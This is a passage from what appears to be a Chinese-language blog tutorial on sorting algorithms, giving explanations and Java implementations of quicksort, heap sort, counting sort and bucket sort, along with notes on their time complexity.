/></p><p>快速排序之所比较快，因为相比冒泡排序，每次交换是跳跃式的。每次排序的时候设置一个基准点，将小于等于基准点的数全部放到基准点的左边，将大于等于基准点的数全部放到基准点的右边。这样在每次交换的时候就不会像冒泡排序一样每次只能在相邻的数之间进行交换，交换的距离就大的多了。因此总的比较和交换次数就少了，速度自然就提高了。当然在最坏的情况下，仍可能是相邻的两个数进行了交换。因此快速排序的最差时间复杂度和冒泡排序是一样的都是 <strong>O(N2)</strong>，它的平均时间复杂度为 <strong>O(NlogN)</strong>。其实快速排序是基于一种叫做“二分”的思想。我们后面还会遇到“二分”思想，到时候再聊。先上代码，如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] arr,<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i,j,temp,t;</span><br><span class="line">        <span class="keyword">if</span>(low&gt;high)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i=low;</span><br><span class="line">        j=high;</span><br><span class="line">        <span class="comment">//temp就是基准位</span></span><br><span class="line">        temp = arr[low];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> (i&lt;j) &#123;</span><br><span class="line">            <span class="comment">//先看右边，依次往左递减</span></span><br><span class="line">            <span class="keyword">while</span> (temp&lt;=arr[j]&amp;&amp;i&lt;j) &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//再看左边，依次往右递增</span></span><br><span class="line">            <span class="keyword">while</span> (temp&gt;=arr[i]&amp;&amp;i&lt;j) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果满足条件则交换</span></span><br><span class="line">            <span class="keyword">if</span> (i&lt;j) &#123;</span><br><span class="line">                t = arr[j];</span><br><span class="line">                arr[j] = arr[i];</span><br><span class="line">                arr[i] = t;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//最后将基准为与i和j相等位置的数字交换</span></span><br><span class="line">         arr[low] = arr[i];</span><br><span class="line">         arr[i] = temp;</span><br><span class="line">        <span class="comment">//递归调用左半数组</span></span><br><span class="line">        quickSort(arr, low, j-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//递归调用右半数组</span></span><br><span class="line">        quickSort(arr, j+<span class="number">1</span>, high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以输入以下数据进行验证</p><p>1061279345108</p><p>运行结果是</p><p>12345678910</p><p>下面是程序执行过程中数组 <strong>a</strong> 的变化过程，带下划线的数表示的已归位的基准数。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">7</span> <span class="number">9</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">10</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">5</span> <span class="number">4</span> <span class="number">6</span> <span class="number">9</span> <span class="number">7</span> <span class="number">10</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">3</span> <span class="number">5</span> <span class="number">4</span> <span class="number">6</span> <span class="number">9</span> <span class="number">7</span> <span class="number">10</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">5</span> <span class="number">4</span> <span class="number">6</span> <span class="number">9</span> <span class="number">7</span> <span class="number">10</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">5</span> <span class="number">4</span> <span class="number">6</span> <span class="number">9</span> <span class="number">7</span> <span class="number">10</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">9</span> <span class="number">7</span> <span class="number">10</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">9</span> <span class="number">7</span> <span class="number">10</span> <span class="number">8</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">8</span> <span class="number">7</span> <span class="number">9</span> <span class="number">10</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><h1 id="7-堆排序"><a href="#7-堆排序" class="headerlink" title="7. 堆排序"></a>7. 堆排序</h1><p><strong>堆排序</strong></p><p>　　堆排序是利用<strong>堆</strong>这种数据结构而设计的一种排序算法，堆排序是一种<strong>选择排序，</strong>它的最坏，最好，平均时间复杂度均为O(nlogn)，它也是不稳定排序。首先简单了解下堆结构。</p><p><strong>堆</strong></p><p>　　<strong>堆是具有以下性质的完全二叉树：每个结点的值都大于或等于其左右孩子结点的值，称为大顶堆；或者每个结点的值都小于或等于其左右孩子结点的值，称为小顶堆。如下图：</strong></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/11-675658660.png" alt="img" style="zoom: 33%;" /></p><p>同时，我们对堆中的结点按层进行编号，将这种逻辑结构映射到数组中就是下面这个样子</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/3-2092264199.png" alt="img" style="zoom:33%;" /></p><p>该数组从逻辑上讲就是一个堆结构，我们用简单的公式来描述一下堆的定义就是：</p><p><strong>大顶堆：arr[i] &gt;= arr[2i+1] &amp;&amp; arr[i] &gt;= arr[2i+2]</strong>  </p><p><strong>小顶堆：arr[i] &lt;= arr[2i+1] &amp;&amp; arr[i] &lt;= arr[2i+2]</strong>  </p><p>ok，了解了这些定义。接下来，我们来看看堆排序的基本思想及基本步骤：</p><p><strong>堆排序基本思想及步骤</strong></p><p>　　<strong>堆排序的基本思想是：将待排序序列构造成一个大顶堆，此时，整个序列的最大值就是堆顶的根节点。将其与末尾元素进行交换，此时末尾就为最大值。然后将剩余n-1个元素重新构造成一个堆，这样会得到n个元素的次小值。如此反复执行，便能得到一个有序序列了</strong></p><p><strong>步骤一 构造初始堆。将给定无序序列构造成一个大顶堆（**</strong>一般升序采用大顶堆，降序采用小顶堆<strong>**)。</strong></p><p>假设给定无序序列结构如下</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/51-934327647.png" alt="img" style="zoom: 50%;" /></p><p>此时我们从最后一个非叶子结点开始（叶结点自然不用调整，第一个非叶子结点 arr.length/2-1=5/2-1=1，也就是下面的6结点），从左至右，从下至上进行调整。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/33-270379236.png" alt="img" style="zoom: 33%;" /></p><p>找到第二个非叶节点4，由于[4,9,8]中9元素最大，4和9交换。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/6-1823585260.png" alt="img" style="zoom:33%;" /></p><p>这时，交换导致了子根[4,5,6]结构混乱，继续调整，[4,5,6]中6最大，交换4和6。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/6-1142194411.png" alt="img" style="zoom: 33%;" /></p><p>此时，我们就将一个无需序列构造成了一个大顶堆。</p><p><strong>步骤二 将堆顶元素与末尾元素进行交换，使末尾元素最大。然后继续调整堆，再将堆顶元素与末尾元素交换，得到第二大元素。如此反复进行交换、重建、交换。</strong></p><p>a.将堆顶元素9和末尾元素4进行交换</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/0-1455153342.png" alt="img" style="zoom:33%;" /></p><p>b.重新调整结构，使其继续满足堆定义</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/5-1280388728.png" alt="img" style="zoom:33%;" /></p><p>c.再将堆顶元素8与末尾元素5进行交换，得到第二大元素8.</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/9-1114983222.png" alt="img" style="zoom:33%;" /></p><p>后续过程，继续进行调整，交换，如此反复进行，最终使得整个序列有序</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/29-935654830.png" alt="img" style="zoom: 50%;" /></p><p>再简单总结下堆排序的基本思路：</p><p>　　<strong>a.将无需序列构建成一个堆，根据升序降序需求选择大顶堆或小顶堆;</strong></p><p>　　<strong>b.将堆顶元素与末尾元素交换，将最大元素”沉”到数组末端;</strong></p><p>　　<strong>c.重新调整结构，使其满足堆定义，然后继续交换堆顶元素与当前末尾元素，反复执行调整+交换步骤，直到整个序列有序。</strong></p><p><strong>代码实现</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sortdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 堆排序demo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeapSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> []arr = &#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>&#125;;</span><br><span class="line">        sort(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> []arr)</span></span>&#123;</span><br><span class="line">        <span class="comment">//1.构建大顶堆</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = arr.length / <span class="number">2</span> - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="comment">//从第一个非叶子结点从下至上，从右至左调整结构</span></span><br><span class="line">            adjustHeap(arr,i,arr.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.调整堆结构+交换堆顶元素与末尾元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = arr.length - <span class="number">1</span>;j &gt; <span class="number">0</span>;j--)&#123;</span><br><span class="line">            swap(arr,<span class="number">0</span>,j);<span class="comment">//将堆顶元素与末尾元素进行交换</span></span><br><span class="line">            adjustHeap(arr,<span class="number">0</span>,j);<span class="comment">//重新对堆进行调整</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 调整大顶堆（仅是调整过程，建立在大顶堆已构建的基础上）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> i</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> length</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">adjustHeap</span><span class="params">(<span class="keyword">int</span> []arr,<span class="keyword">int</span> i,<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[i];<span class="comment">//先取出当前元素i</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = i * <span class="number">2</span> + <span class="number">1</span>;k &lt; length; k = k * <span class="number">2</span> + <span class="number">1</span>)&#123;<span class="comment">//从i结点的左子结点开始，也就是2i+1处开始</span></span><br><span class="line">            <span class="keyword">if</span>(k + <span class="number">1</span> &lt; length &amp;&amp; arr[k] &lt; arr[k+<span class="number">1</span>])&#123;<span class="comment">//如果左子结点小于右子结点，k指向右子结点</span></span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(arr[k] &gt;temp)&#123;<span class="comment">//如果子节点大于父节点，将子节点值赋给父节点（不用进行交换）</span></span><br><span class="line">                arr[i] = arr[k];</span><br><span class="line">                i = k;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[i] = temp;<span class="comment">//将temp值放到最终的位置</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 交换元素</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> a</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> []arr,<span class="keyword">int</span> a ,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp=arr[a];</span><br><span class="line">        arr[a] = arr[b];</span><br><span class="line">        arr[b] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><p>[1, 2, 3, 4, 5, 6, 7, 8, 9]</p><p><strong>最后</strong></p><p>　　堆排序是一种选择排序，整体主要由构建初始堆+交换堆顶元素和末尾元素并重建堆两部分组成。其中构建初始堆经推导复杂度为O(n)，在交换并重建堆的过程中，需交换n-1次，而重建堆的过程中，根据完全二叉树的性质，[log2(n-1),log2(n-2)…1]逐步递减，近似为nlogn。所以堆排序时间复杂度一般认为就是O(nlogn)级。</p><h1 id="8-计数排序"><a href="#8-计数排序" class="headerlink" title="8.  计数排序"></a>8.  计数排序</h1><p>基数排序 、计数排序 、 桶排序这三种排序算法都利用了桶的概念，但对桶的使用方法上有明显差异：</p><ul><li>计数排序：每个桶只存储单一键值；</li><li>桶排序：每个桶存储一定范围的数值；</li><li>基数排序：根据键值的每位数字来分配桶；</li></ul><hr><p>计数排序的核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p><p><strong>计数排序的特征</strong></p><p>当输入的元素是 n 个 0 到 k 之间的整数时，它的运行时间是 Θ(n + k)。计数排序不是比较排序，排序的速度快于任何比较排序算法。</p><p>由于用来计数的数组C的长度取决于待排序数组中数据的范围（等于待排序数组的最大值与最小值的差加上1），这使得计数排序对于数据范围很大的数组，需要大量时间和内存。例如：计数排序是用来排序0到100之间的数字的最好的算法，但是它不适合按字母顺序排序人名。但是，计数排序可以用在基数排序中的算法来排序数据范围很大的数组。</p><p>通俗地理解，例如有 10 个年龄不同的人，统计出有 8 个人的年龄比 A 小，那 A 的年龄就排在第 9 位,用这个方法可以得到其他每个人的位置,也就排好了序。当然，年龄有重复时需要特殊处理（保证稳定性），这就是为什么最后要反向填充目标数组，以及将每个数字的统计减去 1 的原因。</p><p> 算法的步骤如下：</p><ul><li>找出待排序的数组中最大和最小的元素</li><li>统计数组中每个值为i的元素出现的次数，存入数组C的第i项</li><li>对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）</li><li><p>反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1</p><p><strong>动图演示</strong></p></li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/countingsort.gif" alt="img" style="zoom:50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CountingSort</span> <span class="keyword">implements</span> <span class="title">IArraySort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sort(<span class="keyword">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="keyword">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> maxValue = getMaxValue(arr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> countingSort(arr, maxValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] countingSort(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> maxValue) &#123;</span><br><span class="line">        <span class="keyword">int</span> bucketLen = maxValue + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[] bucket = <span class="keyword">new</span> <span class="keyword">int</span>[bucketLen];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> value : arr) &#123;</span><br><span class="line">            bucket[value]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> sortedIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; bucketLen; j++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (bucket[j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                arr[sortedIndex++] = j;</span><br><span class="line">                bucket[j]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getMaxValue</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> value : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxValue &lt; value) &#123;</span><br><span class="line">                maxValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="9-桶排序排序"><a href="#9-桶排序排序" class="headerlink" title="9. 桶排序排序"></a>9. 桶排序排序</h1><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。为了使桶排序更加高效，我们需要做到这两点：</p><ul><li>在额外空间充足的情况下，尽量增大桶的数量</li><li>使用的映射函数能够将输入的 N 个数据均匀的分配到 K 个桶中</li></ul><p>同时，对于桶中元素的排序，选择何种比较排序算法对于性能的影响至关重要。</p><ol><li>什么时候最快</li></ol><p>当输入的数据可以均匀的分配到每一个桶中。</p><ol><li>什么时候最慢</li></ol><p>当输入的数据被分配到了同一个桶中。</p><ol><li>示意图</li></ol><p>元素分布在桶中：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/_sort_1.svg_.png" alt="img"></p><p>然后，元素在每个桶中排序：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/_sort_2.svg_.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BucketSort</span> <span class="keyword">implements</span> <span class="title">IArraySort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> InsertSort insertSort = <span class="keyword">new</span> InsertSort();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sort(<span class="keyword">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="keyword">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line">        <span class="comment">// 设置默认桶的大小为5</span></span><br><span class="line">        <span class="keyword">return</span> bucketSort(arr, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] bucketSort(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> bucketSize) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> arr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> minValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> maxValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> value : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &lt; minValue) &#123;</span><br><span class="line">                minValue = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; maxValue) &#123;</span><br><span class="line">                maxValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//计算桶的数量</span></span><br><span class="line">        <span class="keyword">int</span> bucketCount = (<span class="keyword">int</span>) Math.floor((maxValue - minValue) / bucketSize) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[][] buckets = <span class="keyword">new</span> <span class="keyword">int</span>[bucketCount][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用映射函数将数据分配到各个桶中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> index = (<span class="keyword">int</span>) Math.floor((arr[i] - minValue) / bucketSize);</span><br><span class="line">            buckets[index] = arrAppend(buckets[index], arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> arrIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] bucket : buckets) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bucket.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对每个桶进行排序，这里使用了插入排序</span></span><br><span class="line">            bucket = insertSort.sort(bucket);</span><br><span class="line">            <span class="comment">//收集，按顺序访问桶，将所有元素放回输出数组中</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> value : bucket) &#123;</span><br><span class="line">                arr[arrIndex++] = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动扩容，并保存数据</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] arrAppend(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> value) &#123;</span><br><span class="line">        arr = Arrays.copyOf(arr, arr.length + <span class="number">1</span>);</span><br><span class="line">        arr[arr.length - <span class="number">1</span>] = value;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="10-基数排序"><a href="#10-基数排序" class="headerlink" title="10. 基数排序"></a>10. 